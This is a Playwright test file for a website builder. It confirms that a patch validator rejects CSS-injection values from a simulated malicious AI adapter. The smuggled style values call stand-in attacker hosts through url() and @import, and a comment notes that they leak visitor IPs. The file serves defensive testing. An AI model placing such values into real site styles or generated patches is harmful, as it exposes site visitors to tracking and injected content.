import { test, expect, Page } from '@playwright/test'

// P19 Fix-Pass 2 (F3) regression test.
// Spec: plans/implementation/phase-19/deep-dive/03-security-findings.md (S1+S2).
// UNSAFE_VALUE_RE was extended to reject any string containing `url(` or
// `@import`. We send a malicious adapter-driven patch that smuggles a
// `background-image: url(http://attacker)` payload into a style.background
// field; validatePatches must reject it and the config must remain unchanged.

function trackErrors(page: Page): string[] {
  const errors: string[] = []
  page.on('pageerror', (e) => errors.push(e.message))
  page.on('console', (msg) => {
    if (msg.type() !== 'error') return
    const t = msg.text()
    if (t.includes('Failed to load resource')) return
    if (t.includes('CJS') || t.includes('CommonJS')) return
    errors.push(t)
  })
  return errors
}

async function loadBlogStarter(page: Page): Promise<void> {
  await page.goto('/new-project')
  await page.waitForTimeout(800)
  await page.locator('button', { hasText: 'Examples' }).first().click()
  await page.waitForTimeout(300)
  await page.locator('button', { hasText: 'Stories from the kitchen' }).first().click()
  await page.waitForURL('**/builder')
  await page.waitForSelector('[data-section-id]', { timeout: 10000 })
}

async function ensureProject(page: Page, name: string): Promise<void> {
  await page.evaluate((n) => {
    const cfg = (window as unknown as { __configStore: { getState: () => { config: unknown } } }).__configStore
    const proj = (window as unknown as { __projectStore: { getState: () => { saveProject: (n: string, c: unknown) => void } } }).__projectStore
    proj.getState().saveProject(n, cfg.getState().config as never)
  }, name)
}

async function getHeroBackground(page: Page): Promise<string> {
  return await page.evaluate(() => {
    type Sec = { type: string; style?: { background?: string } }
    const cfg = (window as unknown as { __configStore: { getState: () => { config: { sections: Sec[] } } } }).__configStore
    const hero = cfg.getState().config.sections.find((s) => s.type === 'hero')
    return hero?.style?.background ?? ''
  })
}

test.describe('P19 Fix-Pass 2 — F3: CSS-injection guard', () => {
  test('patch with url(http://attacker) value is rejected; hero style unchanged', async ({ page }) => {
    const errors = trackErrors(page)
    await loadBlogStarter(page)
    await ensureProject(page, 'P19 F3 css-inject url')
    const before = await getHeroBackground(page)

    // Inject a malicious adapter that returns a single-patch envelope landing
    // in a style.background field with an embedded `url(http://attacker)`
    // payload — exfiltrates the visitor IP if it makes it into the rendered
    // CSS. The extended UNSAFE_VALUE_RE must reject it.
    await page.evaluate(() => {
      const intel = (window as unknown as { __intelligenceStore: { setState: (s: unknown) => void } }).__intelligenceStore
      intel.setState({
        adapter: {
          name: () => 'simulated' as const,
          label: () => 'css-inject',
          model: () => 'css-inject-v1',
          testConnection: async () => true,
          complete: async () => ({
            ok: true,
            json: {
              patches: [{
                op: 'replace',
                path: '/sections/0/style/background',
                value: 'red; background-image: url(http://attacker)',
              }],
              summary: 'evil css',
            },
            tokens: { in: 1, out: 1 },
            cost_usd: 0,
          }),
        },
      })
    })

    const chatTab = page.getByRole('tab', { name: /^Chat$/ }).first()
    await chatTab.click()
    const input = page.getByTestId('chat-input')
    await input.click()
    await input.fill('css-inject-trigger-9876543210')
    await page.getByRole('button', { name: /Send message/i }).click()

    // Bradley replies (canned fallback or kind-mapped). Either way, the hero
    // style must NOT have been replaced.
    await expect(page.getByTestId('chat-msg-bradley').first()).toBeVisible({ timeout: 6000 })
    expect(await getHeroBackground(page)).toBe(before)
    expect(errors).toHaveLength(0)
  })

  test('patch with @import value is rejected', async ({ page }) => {
    const errors = trackErrors(page)
    await loadBlogStarter(page)
    await ensureProject(page, 'P19 F3 css-inject import')
    const before = await getHeroBackground(page)

    await page.evaluate(() => {
      const intel = (window as unknown as { __intelligenceStore: { setState: (s: unknown) => void } }).__intelligenceStore
      intel.setState({
        adapter: {
          name: () => 'simulated' as const,
          label: () => 'css-import',
          model: () => 'css-import-v1',
          testConnection: async () => true,
          complete: async () => ({
            ok: true,
            json: {
              patches: [{
                op: 'replace',
                path: '/sections/0/style/background',
                value: '@import url(//attacker.example.com/x.css)',
              }],
              summary: 'evil import',
            },
            tokens: { in: 1, out: 1 },
            cost_usd: 0,
          }),
        },
      })
    })

    const chatTab = page.getByRole('tab', { name: /^Chat$/ }).first()
    await chatTab.click()
    const input = page.getByTestId('chat-input')
    await input.click()
    await input.fill('css-import-trigger-1234567890')
    await page.getByRole('button', { name: /Send message/i }).click()

    await expect(page.getByTestId('chat-msg-bradley').first()).toBeVisible({ timeout: 6000 })
    expect(await getHeroBackground(page)).toBe(before)
    expect(errors).toHaveLength(0)
  })
})
